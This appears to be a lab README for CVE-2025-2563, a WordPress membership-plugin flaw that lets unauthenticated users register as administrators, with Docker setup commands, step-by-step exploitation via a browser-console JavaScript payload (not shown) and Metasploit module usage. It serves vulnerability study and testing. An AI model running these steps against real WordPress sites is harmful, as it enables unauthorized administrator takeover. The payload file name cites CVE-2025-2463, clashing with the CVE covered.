# CVE-2025-2563
The User Registration & Membership WordPress plugin before 4.1.2 does not prevent users to set their account role when the Membership Addon is enabled, leading to a privilege escalation issue and allowing unauthenticated users to gain admin privileges

## Notes

## Metrics
CVSSv2: N\A   
CVSSv3: N\A

## Vulnerability Environment
Build and run:
```bash
docker compose build
docker compose up -d
```
Stop Environment and remove network:
```bash
docker compose down
```
## Detection and exploitation example
1. Run Environment
2. Login to Wordpress (vulnforge / vulnforge123)
4. Enable the `Membership` addon at `/wp-admin/admin.php?page=user-registration-dashboard#/features`.  

Find Membership registration page at `/wp-admin/edit.php?post_type=page`, i.e. `index.php/membership-registration/`

5. As unauthenticated, visit `/membership-pricing/` and register a new user.  
6. As unauthenticated again, visit `/membership-pricing/` and execute the JavaScript payload below via the browser console, replacing the `username` value with the previously registered username.  
7. Upon logging into the registered account, notice that you have `administrator` permissions.  

### Using MSF
>[!note]
> Not work in my case, probably they use `/%postname%/` permalink structure.
Start msfconsole
`use exploit/multi/http/wp_user_registration_membership_escalation`

Set the required options:

```shell
RHOSTS to the target IP or hostname
TARGETURI to the WordPress base path (default /)
(Optional) WP_USER, WP_PASS, WP_EMAIL for the new admin account
```

Check for vulnerability: 
```shell
check
```

Exploit the target: 
```shell
run http://<target_ip>:8080/index.php
```

You should see output indicating an administrator user was created:

```shell
[+] Administrator created: <username>:<password>
```
### Use JS
1. As unauthenticated, visit `/membership-pricing/` and register a new user.  
2. As unauthenticated again, visit `/membership-pricing/` and execute the JavaScript payload (`CVE-2025-2463.js`) via the browser console, replacing the `username` value with the previously registered username.  
3. Upon logging into the registered account, notice that you have `administrator` permissions.  



## Exploits and PoCs
https://github.com/rapid7/metasploit-framework/pull/20159  
https://wpscan.com/vulnerability/2c0f62a1-9510-4f90-a297-17634e6c8b75/  
## Nuclei Template

## CTF Rooms

## References
[NIST: CVE-2025-2563](https://nvd.nist.gov/vuln/detail/CVE-2025-2563)  
[GHSA: GHSA-jxh5-f52q-732j](https://github.com/advisories/GHSA-jxh5-f52q-732j)  
[WPScan: User Registration & Membership (Free < 4.1.2, Pro < 5.1.2) - Unauthenticated Privilege Escalation](https://wpscan.com/vulnerability/2c0f62a1-9510-4f90-a297-17634e6c8b75/)  
  
https://github.com/rapid7/metasploit-framework/blob/master/documentation/modules/exploit/multi/http/wp_user_registration_membership_escalation.md  
https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/multi/http/wp_user_registration_membership_escalation.rb  